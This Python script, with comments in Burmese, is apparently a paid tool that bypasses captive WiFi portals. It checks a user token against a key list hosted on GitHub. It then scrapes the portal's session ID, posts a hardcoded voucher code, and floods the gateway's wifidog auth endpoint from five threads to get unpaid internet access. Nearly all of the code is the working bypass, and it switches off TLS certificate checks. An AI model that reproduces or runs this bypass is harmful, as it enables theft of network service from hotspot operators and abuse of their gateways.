import requests
import re
import urllib3
import time
import threading
from datetime import datetime, timedelta
import sys
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
PING_THREADS = 5
PING_INTERVAL = 0.1 
# သင်ပေးထားသော RAW Link (GitHub မှ keys.txt)
KEYS_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/1d9208ba86e511e966f5cb5ef6130a72cb794a5f/keys.txt"

# --- CLEAR SCREEN FUNCTION ---
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- TOKEN LICENSE SYSTEM (DATE-BASED) ---
def check_license():
    """Token တောင်းခြင်းနှင့် ရက်စွဲအခြေခံသက်တမ်းစစ်ခြင်း"""
    clear_screen()
    print("========================================")
    print("       🔑 TOKEN ACCESS SYSTEM         ")
    print("========================================\n")
    
    try:
        response = requests.get(KEYS_URL, timeout=10)
        lines = response.text.splitlines()
    except Exception as e:
        print(f"❌ Connection Error: {e}")
        return False
        
    user_token = input("👉 သင့် Token ကိုရိုက်ထည့်ပါ: ")
    
    for line in lines:
        if "|" not in line or line.startswith("#"): continue
        try:
            key, start_date_str, unit, amount = line.split("|")
            start_date = datetime.strptime(start_date_str, "%Y-%m-%d")
            amount = int(amount)
        except: continue
        
        if key == user_token:
            # ကုန်မယ့်အချိန် တွက်ချက်ခြင်း
            if unit == 'd':
                end_date = start_date + timedelta(days=amount)
            elif unit == 'h':
                end_date = start_date + timedelta(hours=amount)
            else:
                return False
            
            remaining = end_date - datetime.now()
            
            if remaining.total_seconds() <= 0:
                print("\n❌ သက်တမ်းကုန်ဆုံးသွားပါပြီ။")
                return False
            else:
                print(f"\n✅ သက်တမ်းရှိသည်။ ကုန်ဆုံးချိန်: {end_date}")
                time.sleep(2)
                clear_screen()
                # သက်တမ်းကို နောက်ပြန်ဆုတ်ပြမည့် Thread
                threading.Thread(target=countdown_timer, args=(remaining,), daemon=True).start()
                return True
            
    print("\n❌ Token မှားယွင်းနေပါသည်။")
    return False

def countdown_timer(remaining_time):
    """သက်တမ်းကို နောက်ပြန်ဆုတ်ပြခြင်း"""
    while remaining_time.total_seconds() > 0:
        days, rem = divmod(remaining_time.total_seconds(), 86400)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        
        timer = f"⌛ သက်တမ်း: {int(days)}ရက် {int(hours)}နာရီ {int(minutes)}မိနစ် {int(seconds)}စက္ကန့်"
        print(f"\r{timer}   ", end="", flush=True)
        
        time.sleep(1)
        remaining_time -= timedelta(seconds=1)
    
    print("\n⏰ သက်တမ်းကုန်ဆုံးသွားပါပြီ။ Script ရပ်တန့်မည်။")
    os._exit(0)

# --- INTERNET ACCESS LOGIC (CAPTIVE PORTAL) ---
# (Internet Access Code သည် ယခင်အတိုင်းဖြစ်သည်)
def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, session, sid):
    """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း"""
    while True:
        try:
            res = session.get(auth_link, timeout=5)
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    print(f"\n🚀 Script စတင်နေပါပြီ... အင်တာနက် ချိတ်ဆက်ရန် ကြိုးစားနေသည်...")
    
    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            from urllib.parse import urlparse, parse_qs, urljoin
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            # ၁။ SID ရှာဖွေခြင်း
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                # ၂။ Voucher ကို တစ်ကြိမ် "မဖြစ်မနေ" အရင်စမ်းသပ်ခြင်း
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try:
                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                except:
                    pass

                # ၃။ Gateway Info ယူပြီး Ping ထိုးခြင်း
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while check_real_internet():
                    time.sleep(5)

        except Exception as e:
            time.sleep(5)

# --- MAIN RUNNER ---
if __name__ == "__main__":
    if check_license():
        start_process()
    else:
        print("🚫 အသုံးပြုခွင့် မရှိပါ။")
        
